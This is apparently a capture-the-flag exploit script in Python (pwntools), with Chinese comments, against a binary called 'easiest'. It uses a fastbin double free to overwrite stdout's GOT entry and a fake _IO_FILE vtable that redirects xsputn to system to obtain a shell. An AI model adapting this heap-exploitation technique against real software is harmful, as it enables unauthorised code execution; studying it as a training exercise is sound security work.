from pwn import *

context.log_level = 'debug'
p = process("./easiest")

std_got = 0x60207a  #stdout的got表地址
sys_addr = 0x400946 #程序中的system函数地址
ptr_addr = 0x6020C0 #保存chunk的指针数组

def add(idx,size,content):
	p.recvuntil("2 delete ")
	p.sendline("1")
	p.recvuntil("(0-11):")
	p.sendline(str(idx))
	p.recvuntil("Length:")
	p.sendline(str(size))
	p.recvuntil("C:")
	p.sendline(content)
	
def delete(idx):
	p.recvuntil("2 delete ")
	p.sendline("2")
	p.recvuntil("(0-11):")
	p.sendline(str(idx))

if __name__=='__main__':
	
	payload = p64(0xdeadbeef)*7+p64(sys_addr)
	add(6,0x200,payload)#将stdout中vtable地址覆盖为该chunk的地址，printf 会调用 vtable 中的 xsputn，位于虚表第八项
	#调整申请第几块chunk，保证：
	#(1)IO_FILE结构体中_lock的值必须是可写的地址
    #(2)mode的值需要为0
	add(0,0x30,"a"*0x10)	
	add(1,0x30,"a"*0x10)	
	add(2,0x30,"1"*0x10)	
	add(4,0x100,'p'*0x10)

	delete(2)
	delete(0)
	delete(2) #利用fastbin攻击修改stdout在got表上的地址

	add(2,0x30,p64(std_got))
	add(0,0x30,'xxxx')
	add(0,0x30,'xxxx')
	#gdb.attach(p)
	add(2,0x30,'x'*0x16+p64(ptr_addr+8*6-0xd8))# 64位系统下vtable在_IO_FILE_plus结构中的偏移是0xd8
	#所以将stdout的地址加上0xd8就是保存chunk 6的地址，即保存虚表的地址
	p.sendline('aaaa')
	p.interactive()
